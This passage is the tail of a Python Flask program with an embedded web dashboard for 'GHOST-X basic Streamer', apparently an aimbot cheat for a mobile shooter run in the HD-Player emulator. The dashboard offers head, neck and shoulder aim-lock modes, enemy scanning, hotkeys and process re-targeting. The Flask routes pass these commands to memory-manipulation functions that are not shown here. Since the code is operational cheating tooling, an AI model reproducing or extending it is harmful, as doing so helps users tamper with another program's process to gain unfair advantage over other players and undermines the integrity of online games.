    body.blue .button.exit { background-color: #dc3545; color: white; border-color: #dc3545; }
    body.blue select { background-color: #0059b3; color: #aad4ff; border: 1px solid #3399ff; }
    .display-none { display: none; }
    .slider-container { width: 100%; margin: 10px 0; }
    .slider-label { display: flex; justify-content: space-between; margin-bottom: 5px; font-size: 14px; }
    .slider-value { color: #90caf9; font-weight: bold; }
    .slider { -webkit-appearance: none; width: 100%; height: 6px; border-radius: 3px; background: #333; outline: none; }
    .slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 18px; height: 18px; border-radius: 50%; background: #3399ff; cursor: pointer; border: 2px solid #fff; }
    .entity-info { background-color: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 12px; margin-top: 8px; width: 100%; }
    .entity-stats { display: flex; flex-direction: column; gap: 6px; }
    .entity-stat { display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
    .stat-label { color: #ccc; font-weight: 500; }
    .stat-value { color: #90ee90; font-weight: bold; background-color: #2a2a2a; padding: 2px 8px; border-radius: 4px; min-width: 40px; text-align: center; }
    .alternative-process-section { background-color: #2a1a1a; border: 1px solid #3399ff; border-radius: 8px; padding: 12px; margin-top: 8px; }
    .alternative-process-section h3 { color: #ff6b6b; margin-top: 0; font-size: 16px; }
    .process-selector-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; flex-wrap: wrap; gap: 10px; }
    .process-selector-label { font-size: 14px; margin-bottom: 4px; min-width: 140px; color: #ff9999; }
    .process-selector-note { font-size: 12px; color: #ffaaaa; margin-top: 2px; }
    #process-selector { min-width: 200px; background-color: #3a2a2a; border: 1px solid #3399ff; color: #ffdddd; }
    #refresh-processes { background-color: #3399ff; color: white; border: 1px solid #3399ff; }
    #refresh-processes:hover { background-color: #2277dd; }
    .current-process { font-size: 12px; color: #90ee90; margin-top: 2px; font-style: italic; }
  </style>
  <script>
  function startEntityInfoUpdater() {
    updateEntityInfo();
    setInterval(updateEntityInfo, 1000);
  }
  let hotkeysEnabled = true;
  function updateEntityInfo() {
    fetch('/get_entity_info')
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          document.getElementById('aliveCount').textContent = data.alive;
          document.getElementById('knockedCount').textContent = data.knocked;
          document.getElementById('deadCount').textContent = data.dead;
          document.getElementById('totalCount').textContent = data.total;
          const matchStatus = document.getElementById('matchStatus');
          if (matchStatus) {
            if (data.match_active && !data.match_ended) {
              matchStatus.textContent = 'Active';
              matchStatus.style.color = '#90ee90';
              hotkeysEnabled = true;
            } else {
              matchStatus.textContent = 'Ended/Not Started';
              matchStatus.style.color = '#ff6b6b';
              hotkeysEnabled = false;
            }
          }
        }
      })
      .catch(err => {
        document.getElementById('aliveCount').textContent = '0';
        document.getElementById('knockedCount').textContent = '0';
        document.getElementById('deadCount').textContent = '0';
        document.getElementById('totalCount').textContent = '0';
        const matchStatus = document.getElementById('matchStatus');
        if (matchStatus) {
          matchStatus.textContent = 'Error';
          matchStatus.style.color = '#ff6b6b';
          hotkeysEnabled = false;
        }
      });
  }
  function startHDPlayerStatusUpdater() {
    updateHDPlayerStatus();
    setInterval(updateHDPlayerStatus, 3000);
  }
  function updateHDPlayerStatus() {
    fetch('/get_hd_player_status')
      .then(response => response.json())
      .then(data => {
        const badge = document.getElementById('statusBadge');
        const statusText = document.getElementById('statusText');
        const currentProcessText = document.getElementById('currentProcessText');
        const alternativeProcessSection = document.getElementById('alternative-process-section');
        if (data.is_running) {
          badge.textContent = 'Online';
          badge.className = 'badge online';
          statusText.textContent = 'Connected to GHOST-X basic';
          currentProcessText.textContent = `Process: ${data.current_process}`;
          if (alternativeProcessSection) alternativeProcessSection.style.display = 'none';
        } else {
          badge.textContent = 'Offline';
          badge.className = 'badge offline';
          statusText.textContent = 'Server Offline';
          currentProcessText.textContent = `Process: ${data.current_process}`;
          if (alternativeProcessSection) alternativeProcessSection.style.display = 'block';
        }
      })
      .catch(err => console.log('Error updating process status:', err));
  }
  function updateProcessList() {
    fetch('/get_processes')
      .then(response => response.json())
      .then(data => {
        const processSelector = document.getElementById('process-selector');
        if (processSelector && data.success) {
          processSelector.innerHTML = '<option value="">Select a process...</option>';
          data.processes.forEach(process => {
            const option = document.createElement('option');
            option.value = process.name;
            option.textContent = `${process.name} (PID: ${process.pid})`;
            processSelector.appendChild(option);
          });
          showNotification('Process list updated');
        }
      })
      .catch(err => showNotification('Error updating process list'));
  }
  function setTargetProcess() {
    const processSelector = document.getElementById('process-selector');
    const selectedProcess = processSelector.value;
    if (!selectedProcess) { showNotification('Please select a process first'); return; }
    fetch('/set_target_process', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ process_name: selectedProcess }),
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        showNotification(`Target process set to: ${selectedProcess}`);
        const currentProcessText = document.getElementById('currentProcessText');
        if (currentProcessText) currentProcessText.textContent = `Process: ${selectedProcess}`;
        updateHDPlayerStatus();
      } else { showNotification(`Failed to set process: ${data.message}`); }
    })
    .catch(err => showNotification('Error setting target process'));
  }
  document.addEventListener('DOMContentLoaded', function() {
    startEntityInfoUpdater();
    startHDPlayerStatusUpdater();
    updateProcessList();
  });
  </script>
</head>
<body>
<div class="container">
  <div class="panel">
    <div class="status">
      <div><strong>GHOST-X basic Streamer</strong><br /><span id="statusText">Checking process status...</span><br /><span id="currentProcessText" class="current-process">Process: HD-Player</span></div>
      <div class="badge" id="statusBadge">Checking...</div>
    </div>
  </div>
  <div class="panel alternative-process-section display-none" id="alternative-process-section">
    <h2>Alternative Process Selector</h2>
    <div class="process-selector-row">
      <div><div class="process-selector-label">Select Process</div><div class="process-selector-note">Current process is offline. Select an alternative process to attach to.</div></div>
      <div class="section-buttons"><select id="process-selector"><option value="">Select a process...</option></select><div class="button" id="refresh-processes" onclick="updateProcessList()">Refresh</div><div class="button" onclick="setTargetProcess()">Set Process</div></div>
    </div>
  </div>
  <div class="panel">
    <h2>Entity Monitoring</h2>
    <div class="aim-row"><div><div class="aim-label">Entity Information</div><div class="note">Live match status (updates every second)</div></div>
    <div class="entity-info" id="entityInfo"><div class="entity-stats"><div class="entity-stat"><span class="stat-label">Alive Players:</span><span class="stat-value" id="aliveCount">0</span></div><div class="entity-stat"><span class="stat-label">Knocked Players:</span><span class="stat-value" id="knockedCount">0</span></div><div class="entity-stat"><span class="stat-label">Dead Players:</span><span class="stat-value" id="deadCount">0</span></div><div class="entity-stat"><span class="stat-label">Total Entities:</span><span class="stat-value" id="totalCount">0</span></div><div class="entity-stat"><span class="stat-label">Match Status:</span><span class="stat-value" id="matchStatus">Checking...</span></div></div></div></div>
  </div>
  <div class="panel">
    <div class="tab-buttons"><div class="button active" data-tab="headshot">Headshot</div><div class="button" data-tab="settings">Settings</div></div>
  </div>
  <div class="panel content-panel active" id="headshot">
    <h2>Aimbot Options</h2>
    <div class="aim-section">
      <div class="aim-row"><div><div class="aim-label">Scan Enemies</div><div class="note">Scans enemies in the match</div></div><div class="button aim-option" data-group="aim-row" data-value="default" onclick="sendCommand('aimbotscan')">Scan Players</div></div>
      <div class="aim-row"><div><div class="aim-label">Aim Position</div><div class="note">Hotkey - Help</div></div><div class="aim-buttons"><div class="button aim-option" data-group="aimpos" data-value="neck" onclick="sendCommand('aimbotenable')">Neck</div><div class="button aim-option active" data-group="aimpos" data-value="default" onclick="sendCommand('aimbotdisable')">Default</div></div></div>
      <div class="aim-row"><div><div class="aim-label">Other Aim Position</div><div class="note">Hotkey - Help</div></div><select id="other-aimpos" onchange="updateSelectedAimbot()"><option value="RightShoulder">Right Shoulder</option><option value="LeftShoulder">Left Shoulder</option><option value="AimbotAi">Aimbot Ai</option></select></div>
      <div class="aim-row leftShoulder display-none"><div><div class="aim-label">Headshot Legit</div><div class="note">Left Shoulder</div></div><div class="aim-buttons"><div class="button aim-option" data-group="headshotlegit" data-value="enable" onclick="sendCommand('leftShoulderOn')">Enable</div><div class="button aim-option active" data-group="headshotlegit" data-value="disable" onclick="sendCommand('leftShoulderOff')">Disable</div></div></div>
      <div class="aim-row rightShoulder"><div><div class="aim-label">Headshot Legit</div><div class="note">Right Shoulder</div></div><div class="aim-buttons"><div class="button aim-option" data-group="headshotlegit" data-value="enable" onclick="sendCommand('rightShoulderOn')">Enable</div><div class="button aim-option active" data-group="headshotlegit" data-value="disable" onclick="sendCommand('rightShoulderOff')">Disable</div></div></div>
      <div class="aim-row Aiaimbot display-none"><div><div class="aim-label">Headshot Legit</div><div class="note">Aimbot Ai</div></div><div class="aim-buttons"><div class="button aim-option" data-group="headshotlegit" data-value="enable" onclick="sendCommand('AimbotAion')">Enable</div><div class="button aim-option active" data-group="headshotlegit" data-value="disable" onclick="sendCommand('AimbotAioff')">Disable</div></div></div>
      <hr style="margin-top:20px; margin-bottom:20px;">
      <h2>GHOST-X basic Special Aimbot</h2>
      <div class="aim-row"><div><div class="aim-label">Aimbot X (Hotkey Target)</div><div class="note">Select which aimbot hotkeys will trigger</div></div><select id="hotkey-aimbot-selector" onchange="updateHotkeyAimbot()"><option value="Head" selected>Head (Default)</option><option value="RightShoulder">Right Shoulder</option><option value="LeftShoulder">Left Shoulder</option><option value="AimbotAi">Aimbot Ai</option></select></div>
      <div class="aim-row"><div><div class="aim-label">Ignore Knocked Enemies</div><div class="note">When enabled, aimbot ignores knocked players</div></div><div class="aim-buttons"><div class="button aim-option active" data-group="ignoreknocked" data-value="yes" onclick="sendCommand('ignoreknocked_yes')">Yes</div><div class="button aim-option" data-group="ignoreknocked" data-value="no" onclick="sendCommand('ignoreknocked_no')">No</div></div></div>
    </div>
  </div>
  <div class="panel content-panel" id="settings">
    <h2>Settings</h2>
    <div class="settings-section">
      <div class="settings-row"><div><div class="settings-label">Theme Selector</div><select id="theme-selector"><option value="dark" selected>Dark</option><option value="light">Light</option></select></div></div>
      <div class="settings-row"><div><div class="settings-label">Hotkeys</div><div class="note">Select hotkeys from dropdown (mobile-friendly)</div></div></div>
      <div class="settings-row"><div><div class="settings-label">Aimbot Legit Toggle</div><div class="note">Toggle aimbot legit with a hotkey</div></div><div class="settings-buttons"><select id="hotkey-selector"><option value="">None</option><optgroup label="Alphabet Keys"><option value="A">A</option><option value="B">B</option><option value="C">C</option><option value="D">D</option><option value="E">E</option><option value="F">F</option><option value="G">G</option><option value="H">H</option><option value="I">I</option><option value="J">J</option><option value="K">K</option><option value="L">L</option><option value="M">M</option><option value="N">N</option><option value="O">O</option><option value="P">P</option><option value="Q">Q</option><option value="R">R</option><option value="S">S</option><option value="T">T</option><option value="U">U</option><option value="V">V</option><option value="W">W</option><option value="X">X</option><option value="Y">Y</option><option value="Z">Z</option></optgroup><optgroup label="Number Keys"><option value="0">0</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option></optgroup><optgroup label="Function Keys"><option value="F1">F1</option><option value="F2">F2</option><option value="F3">F3</option><option value="F4">F4</option><option value="F5">F5</option><option value="F6">F6</option><option value="F7">F7</option><option value="F8">F8</option><option value="F9">F9</option><option value="F10">F10</option><option value="F11">F11</option><option value="F12">F12</option></optgroup><optgroup label="Special Keys"><option value="Space">Space</option><option value="Enter">Enter</option><option value="Shift">Shift</option><option value="Control">Control</option><option value="Alt">Alt</option><option value="Tab">Tab</option><option value="CapsLock">Caps Lock</option><option value="Escape">Escape</option><option value="Backspace">Backspace</option><option value="Insert">Insert</option><option value="Delete">Delete</option><option value="Home">Home</option><option value="End">End</option><option value="PageUp">Page Up</option><option value="PageDown">Page Down</option><option value="ArrowUp">Arrow Up</option><option value="ArrowDown">Arrow Down</option><option value="ArrowLeft">Arrow Left</option><option value="ArrowRight">Arrow Right</option></optgroup><optgroup label="Mouse Buttons"><option value="MouseLeft">Mouse Left</option><option value="MouseRight">Mouse Right</option><option value="MouseMiddle">Mouse Middle</option><option value="MouseButton4">Mouse Button 4</option><option value="MouseButton5">Mouse Button 5</option></optgroup></select></div></div>
      <div class="settings-row"><div><div class="settings-label">Headshot Toggle (Hold)</div><div class="note">Hold key for Aimbot Legit</div></div><div class="settings-buttons"><select id="hold-hotkey-selector"><option value="">None</option><optgroup label="Alphabet Keys"><option value="A">A</option><option value="B">B</option><option value="C">C</option><option value="D">D</option><option value="E">E</option><option value="F">F</option><option value="G">G</option><option value="H">H</option><option value="I">I</option><option value="J">J</option><option value="K">K</option><option value="L">L</option><option value="M">M</option><option value="N">N</option><option value="O">O</option><option value="P">P</option><option value="Q">Q</option><option value="R">R</option><option value="S">S</option><option value="T">T</option><option value="U">U</option><option value="V">V</option><option value="W">W</option><option value="X">X</option><option value="Y">Y</option><option value="Z">Z</option></optgroup><optgroup label="Number Keys"><option value="0">0</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option></optgroup><optgroup label="Function Keys"><option value="F1">F1</option><option value="F2">F2</option><option value="F3">F3</option><option value="F4">F4</option><option value="F5">F5</option><option value="F6">F6</option><option value="F7">F7</option><option value="F8">F8</option><option value="F9">F9</option><option value="F10">F10</option><option value="F11">F11</option><option value="F12">F12</option></optgroup><optgroup label="Special Keys"><option value="Space">Space</option><option value="Enter">Enter</option><option value="Shift">Shift</option><option value="Control">Control</option><option value="Alt">Alt</option><option value="Tab">Tab</option><option value="CapsLock">Caps Lock</option><option value="Escape">Escape</option><option value="Backspace">Backspace</option><option value="Insert">Insert</option><option value="Delete">Delete</option><option value="Home">Home</option><option value="End">End</option><option value="PageUp">Page Up</option><option value="PageDown">Page Down</option><option value="ArrowUp">Arrow Up</option><option value="ArrowDown">Arrow Down</option><option value="ArrowLeft">Arrow Left</option><option value="ArrowRight">Arrow Right</option></optgroup><optgroup label="Mouse Buttons"><option value="MouseLeft">Mouse Left</option><option value="MouseRight">Mouse Right</option><option value="MouseMiddle">Mouse Middle</option><option value="MouseButton4">Mouse Button 4</option><option value="MouseButton5">Mouse Button 5</option></optgroup></select></div></div>
      <div class="settings-row"><div><div class="settings-label">Hold Key Delay</div><div class="note">Delay before aimbot activates when holding key</div></div><div class="slider-container"><div class="slider-label"><span>Delay:</span><span class="slider-value" id="delayValue">50ms</span></div><input type="range" min="0" max="300" value="50" class="slider" id="delaySlider"></div></div>
      <div class="extra-row"><div><div class="extra-label">Log Out</div><div class="note">Logs you out of the website.</div></div><div class="extra-buttons"><div class="button extra-option" data-group="norecoil" data-value="on" onclick="logout()">Log Out</div></div></div>
      <div class="extra-row"><div><div class="extra-label">Exit Application</div><div class="note">Closes the GHOST-X basic Streamer application</div></div><div class="extra-buttons"><div class="button exit" onclick="exitApplication()">Exit</div></div></div>
    </div>
  </div>
  <div class="panel"><h2>Console</h2><div class="console" id="console"></div></div>
</div>
<div id="notifications-container"></div>
<script>
function logout() { fetch('/logout', { method: 'POST' }).then(() => { window.location.href = '/'; }); }
function exitApplication() { if (confirm('Are you sure you want to exit GHOST-X basic Streamer? All features will be disabled.')) { fetch('/exit', { method: 'POST' }).then(() => { const consoleEl = document.getElementById('console'); const now = new Date(); const time = now.toLocaleTimeString(); consoleEl.textContent += `[${time}] Application shutting down...\n`; consoleEl.scrollTop = consoleEl.scrollHeight; showNotification('Application shutting down...'); setTimeout(() => { window.close(); }, 2000); }).catch(err => { console.log('Exit error:', err); showNotification('Error exiting application'); }); } }
function updateSelectedAimbot() { const selectedAimbot = document.getElementById('other-aimpos').value; fetch('/update_selected_aimbot', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ aimbot: selectedAimbot }) }).then(response => response.json()).then(data => { if (data.success) console.log(`Selected aimbot updated to: ${selectedAimbot}`); }); }
</script>
<script>
(() => {
  const consoleEl = document.getElementById('console');
  const notificationsContainer = document.getElementById('notifications-container');
  const hotkeySelector = document.getElementById('hotkey-selector');
  const holdHotkeySelector = document.getElementById('hold-hotkey-selector');
  const delaySlider = document.getElementById('delaySlider');
  const delayValue = document.getElementById('delayValue');
  let aimbotStates = { "LeftShoulder": false, "RightShoulder": false, "AimbotAi": false };
  function log(message) { const now = new Date(); const time = now.toLocaleTimeString(); consoleEl.textContent += `[${time}] ${message}\n`; consoleEl.scrollTop = consoleEl.scrollHeight; }
  function showNotification(message) { const notif = document.createElement('div'); notif.className = 'notification'; notif.textContent = message; notificationsContainer.appendChild(notif); notif.addEventListener('animationend', () => { notificationsContainer.removeChild(notif); }); }
  document.addEventListener('DOMContentLoaded', function() { hotkeySelector.value = ''; holdHotkeySelector.value = ''; delaySlider.value = 50; delayValue.textContent = '50ms'; log('Hotkey system ready - please configure your hotkeys'); });
  hotkeySelector.addEventListener('change', function() { const selectedKey = this.value; if (selectedKey) { saveHotkey(selectedKey); log(`Hotkey set to: ${selectedKey}`); showNotification(`Hotkey set to: ${selectedKey}`); } else { saveHotkey(''); log('Hotkey cleared'); showNotification('Hotkey cleared'); } });
  holdHotkeySelector.addEventListener('change', function() { const selectedKey = this.value; if (selectedKey) { saveHoldHotkey(selectedKey); log(`Hold hotkey set to: ${selectedKey}`); showNotification(`Hold hotkey set to: ${selectedKey}`); } else { saveHoldHotkey(''); log('Hold hotkey cleared'); showNotification('Hold hotkey cleared'); } });
  delaySlider.addEventListener('input', function() { const delay = parseInt(this.value); delayValue.textContent = delay + 'ms'; saveHoldDelay(delay); });
  delaySlider.addEventListener('change', function() { const delay = parseInt(this.value); log(`Hold key delay set to: ${delay}ms`); showNotification(`Hold key delay set to: ${delay}ms`); });
  function saveHotkey(key) { fetch('/save_hotkey', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ hotkey: key }) }).then(response => response.json()).then(data => { if (data.success) console.log(`Hotkey saved: ${key}`); }).catch(err => console.log(`Error saving hotkey: ${err.message}`)); }
  function saveHoldHotkey(key) { fetch('/save_hold_hotkey', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ hotkey: key }) }).then(response => response.json()).then(data => { if (data.success) console.log(`Hold hotkey saved: ${key}`); }).catch(err => console.log(`Error saving hold hotkey: ${err.message}`)); }
  function saveHoldDelay(delay) { fetch('/save_hold_delay', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ delay: delay }) }).then(response => response.json()).then(data => { if (data.success) console.log(`Hold delay saved: ${delay}ms`); }).catch(err => console.log(`Error saving hold delay: ${err.message}`)); }
  function updateLocalState(command) { if (command === 'leftShoulderOn') aimbotStates["LeftShoulder"] = true; else if (command === 'leftShoulderOff') aimbotStates["LeftShoulder"] = false; else if (command === 'rightShoulderOn') aimbotStates["RightShoulder"] = true; else if (command === 'rightShoulderOff') aimbotStates["RightShoulder"] = false; else if (command === 'AimbotAion') aimbotStates["AimbotAi"] = true; else if (command === 'AimbotAioff') aimbotStates["AimbotAi"] = false; }
  function setupToggleButtons(containerSelector) { const container = document.querySelector(containerSelector); if (!container) return; container.querySelectorAll('.button').forEach(button => { button.addEventListener('click', () => { const group = button.dataset.group; if (!group) return; if (button.classList.contains('active')) return; container.querySelectorAll(`.button.active[data-group="${group}"]`).forEach(btn => { btn.classList.remove('active'); }); button.classList.add('active'); const command = button.getAttribute('onclick'); if (command && command.includes('sendCommand')) { const match = command.match(/sendCommand\('([^']+)'\)/); if (match) { updateLocalState(match[1]); } } }); }); }
  function setupArchitectureButtons() { const container = document.getElementById('architecture-buttons'); if (!container) return; const buttons = container.querySelectorAll('.button'); buttons.forEach(btn => { btn.addEventListener('click', () => { if (btn.classList.contains('active')) return; buttons.forEach(b => b.classList.remove('active')); btn.classList.add('active'); const arch = btn.dataset.arch || "(unknown)"; log(`Architecture set to: ${arch}`); showNotification(`Architecture set to ${arch}`); }); }); }
  const tabButtons = document.querySelectorAll('.tab-buttons .button'); const contentPanels = document.querySelectorAll('.content-panel');
  tabButtons.forEach(button => { button.addEventListener('click', () => { const tab = button.getAttribute('data-tab'); tabButtons.forEach(btn => btn.classList.remove('active')); button.classList.add('active'); contentPanels.forEach(panel => { if (panel.id === tab) panel.classList.add('active'); else panel.classList.remove('active'); }); }); });
  const archButtons = document.querySelectorAll('#architecture-buttons .button'); archButtons.forEach(btn => { btn.addEventListener('click', () => { archButtons.forEach(b => b.classList.remove('active')); btn.classList.add('active'); log(`Architecture selected: ${btn.textContent}`); }); });
  window.sendCommand = function(command) { if (command == "aimbotscan") { log(`Scanning with Adv Method.`); } else if (command == "loadsniper") { log(`Initializing Sniper Functions.`); } else if (command == "removerecoil") { log(`Removing Recoil.`); } else if (command == "addrecoil") { log(`Restoring Recoil.`); } updateLocalState(command); fetch('/execute', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command }) }).then(response => { if (!response.ok) throw new Error(`Server error: ${response.status}`); return response.json(); }).then(data => { if (data.message) { log(`${data.message}`); } else { log(`Failed`); } }).catch(err => { log(`Error: ${err.message}`); showNotification(`Error.`); }); };
  document.querySelectorAll('.button').forEach(btn => { btn.addEventListener('click', () => {}); });
  setupArchitectureButtons(); setupToggleButtons('#headshot .aim-section'); setupToggleButtons('#settings .settings-section');
  const themeSelector = document.getElementById('theme-selector'); themeSelector.addEventListener('change', () => { document.body.className = themeSelector.value; log(`Theme changed to: ${themeSelector.value}`); showNotification(`Theme changed to: ${themeSelector.value}`); });
})();
</script>
<script>
document.addEventListener('DOMContentLoaded', function () {
  const select = document.getElementById('other-aimpos');
  const leftShoulder = document.querySelector('.leftShoulder');
  const rightShoulder = document.querySelector('.rightShoulder');
  const AiAimbot = document.querySelector('.Aiaimbot');
  select.addEventListener('change', function () {
    const selectedValue = select.value;
    if (selectedValue === 'LeftShoulder') { leftShoulder.classList.remove('display-none'); rightShoulder.classList.add('display-none'); AiAimbot.classList.add('display-none'); }
    else if (selectedValue === 'RightShoulder') { leftShoulder.classList.add('display-none'); rightShoulder.classList.remove('display-none'); AiAimbot.classList.add('display-none'); }
    else if (selectedValue === 'AimbotAi') { AiAimbot.classList.remove('display-none'); leftShoulder.classList.add('display-none'); rightShoulder.classList.add('display-none'); }
  });
});
function updateHotkeyAimbot() { const selectedAimbot = document.getElementById('hotkey-aimbot-selector').value; fetch('/update_hotkey_aimbot', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ aimbot: selectedAimbot }) }).then(response => response.json()).then(data => { if (data.success) { console.log(`Hotkey aimbot updated to: ${selectedAimbot}`); showNotification(`Hotkey target set to: ${selectedAimbot}`); } }); }
document.addEventListener('DOMContentLoaded', function() { fetch('/get_hotkey_aimbot').then(response => response.json()).then(data => { if (data.success && data.aimbot) { document.getElementById('hotkey-aimbot-selector').value = data.aimbot; } }); });
function setIgnoreKnocked(ignore) { fetch('/set_ignore_knocked', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ignore_knocked: ignore }) }).then(response => response.json()).then(data => { if (data.success) { const status = ignore ? 'Yes' : 'No'; const group = 'ignoreknocked'; const container = document.querySelector('#headshot .aim-section'); container.querySelectorAll(`.button.active[data-group="${group}"]`).forEach(btn => { btn.classList.remove('active'); }); event.target.classList.add('active'); log(`Ignore knocked enemies: ${status}`); showNotification(`Ignore knocked: ${status}`); } }).catch(err => { log(`Error: ${err.message}`); }); }
document.addEventListener('DOMContentLoaded', function() { const ignoreKnockedYes = document.querySelector('[data-group="ignoreknocked"][data-value="yes"]'); if (ignoreKnockedYes) { ignoreKnockedYes.classList.add('active'); } log('Ignore knocked enemies: Yes (default)'); });
</script>
</body>
</html>
"""

# ==================== FLASK ROUTES ====================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        success, message = authenticate_user(username, password)
        if success:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            return render_template_string(LOGIN_HTML, error=message)
    return render_template_string(LOGIN_HTML)

@app.route('/index.html')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(INDEX_HTML, username=session.get('username'))

@app.route('/logout')
def logout():
    send_report('logout')
    session.clear()
    return redirect(url_for('login'))

@app.route('/execute', methods=['POST'])
def execute_command():
    if not session.get('logged_in'):
        return jsonify({"success": False, "message": "Not logged in"}), 401
    
    data = request.get_json()
    command = data.get('command')
    
    result = "Unknown command"
    
    if command == "aimbotscan":
        result = HEADLOAD()
    elif command == "aimbotenable":
        result = HEADON()
    elif command == "aimbotdisable":
        result = AIMBOT_OFF()
    elif command == "leftShoulderOn":
        result = LEFTSHOULDERON()
    elif command == "leftShoulderOff":
        result = LEFTSHOULDEROFF()
    elif command == "rightShoulderOn":
        result = RIGHTSHOULDERON()
    elif command == "rightShoulderOff":
        result = RIGHTSHOULDEROFF()
    elif command == "AimbotAion":
        result = AIMBOTAI_ON()
    elif command == "AimbotAioff":
        result = AIMBOTAIOFF()
    elif command == "ignoreknocked_yes":
        user_settings['ignore_knocked'] = True
        result = "Ignore knocked enemies: Yes"
    elif command == "ignoreknocked_no":
        user_settings['ignore_knocked'] = False
        result = "Ignore knocked enemies: No"
    
    return jsonify({"success": True, "message": result})

@app.route('/save_hotkey', methods=['POST'])
def save_hotkey():
    if not session.get('logged_in'):
        return jsonify({"success": False, "message": "Not logged in"}), 401
    data = request.get_json()
    hotkey = data.get('hotkey')
    return jsonify({"success": True})

@app.route('/save_hold_hotkey', methods=['POST'])
def save_hold_hotkey_route():
    if not session.get('logged_in'):
        return jsonify({"success": False}), 401
    data = request.get_json()
    hotkey_state["hold_key"] = data.get('hotkey', '') or None
    return jsonify({"success": True})

@app.route('/save_hold_delay', methods=['POST'])
def save_hold_delay_route():
    if not session.get('logged_in'):
        return jsonify({"success": False}), 401
    data = request.get_json()
    hotkey_state["delay"] = data.get('delay', 50)
    return jsonify({"success": True})

@app.route('/get_hold_delay', methods=['GET'])
def get_hold_delay_route():
    if not session.get('logged_in'):
        return jsonify({"success": False}), 401
    return jsonify({"success": True, "delay": hotkey_state["delay"]})

@app.route('/update_selected_aimbot', methods=['POST'])
def update_selected_aimbot():
    if not session.get('logged_in'):
        return jsonify({"success": False}), 401
    return jsonify({"success": True})

@app.route('/update_hotkey_aimbot', methods=['POST'])
def update_hotkey_aimbot():
    if not session.get('logged_in'):
        return jsonify({"success": False}), 401
    data = request.get_json()
    user_settings['hotkey_aimbot'] = data.get('aimbot', 'Head')
    return jsonify({"success": True})

@app.route('/get_hotkey_aimbot', methods=['GET'])
def get_hotkey_aimbot():
    if not session.get('logged_in'):
        return jsonify({"success": False}), 401
    return jsonify({"success": True, "aimbot": user_settings.get('hotkey_aimbot', 'Head')})

@app.route('/set_ignore_knocked', methods=['POST'])
def set_ignore_knocked_route():
    if not session.get('logged_in'):
        return jsonify({"success": False}), 401
    data = request.get_json()
    user_settings['ignore_knocked'] = data.get('ignore_knocked', True)
    return jsonify({"success": True})

@app.route('/get_entity_info', methods=['GET'])
def get_entity_info():
    if not session.get('logged_in'):
        return jsonify({"success": False, "message": "Not logged in"}), 401
    
    entities_in_match = 0
    if aimbot_addresses and is_initialized:
        for entity in aimbot_addresses:
            state = get_entity_state(entity)
            if state != 'not_in_match' and state != 'error' and state != 'unknown':
                entities_in_match += 1
    
    match_active = (entities_in_match > 0) and is_initialized and (len(aimbot_addresses) > 0)
    
    return jsonify({
        "success": True,
        "alive": len(entity_states.get('alive', [])),
        "knocked": len(entity_states.get('knocked', [])),
        "dead": len(entity_states.get('dead', [])),
        "total": len(aimbot_addresses),
        "match_active": match_active,
        "match_ended": match_ended
    })

@app.route('/get_hd_player_status', methods=['GET'])
def get_hd_player_status():
    if not session.get('logged_in'):
        return jsonify({"success": False, "message": "Not logged in"}), 401
    
    is_running = is_target_process_running()
    
    return jsonify({
        "success": True,
        "is_running": is_running,
        "current_process": current_process_name
    })

@app.route('/get_processes', methods=['GET'])
def get_processes():
    if not session.get('logged_in'):
        return jsonify({"success": False, "message": "Not logged in"}), 401
    
    processes = get_running_processes()
    
    return jsonify({
        "success": True,
        "processes": processes
    })

@app.route('/set_target_process', methods=['POST'])
def set_target_process_route():
    if not session.get('logged_in'):
        return jsonify({"success": False, "message": "Not logged in"}), 401
    
    data = request.get_json()
    process_name = data.get('process_name')
    
    if not process_name:
        return jsonify({"success": False, "message": "No process name provided"})
    
    success = set_target_process(process_name)
    
    if success:
        return jsonify({
            "success": True,
            "message": f"Target process set to: {process_name}"
        })
    else:
        return jsonify({
            "success": False,
            "message": f"Failed to set target process to: {process_name}"
        })

@app.route('/exit', methods=['POST'])
def exit_route():
    if not session.get('logged_in'):
        return jsonify({"success": False, "message": "Not logged in"}), 401
    threading.Thread(target=lambda: (time.sleep(1), exit_application()), daemon=True).start()
    return jsonify({"success": True})

# ==================== MAIN ====================
if __name__ == '__main__':
    threading.Thread(target=hold_hotkey_monitor, daemon=True).start()
    app.run(host='0.0.0.0', port=SERVER_PORT, debug=False, use_reloader=False)
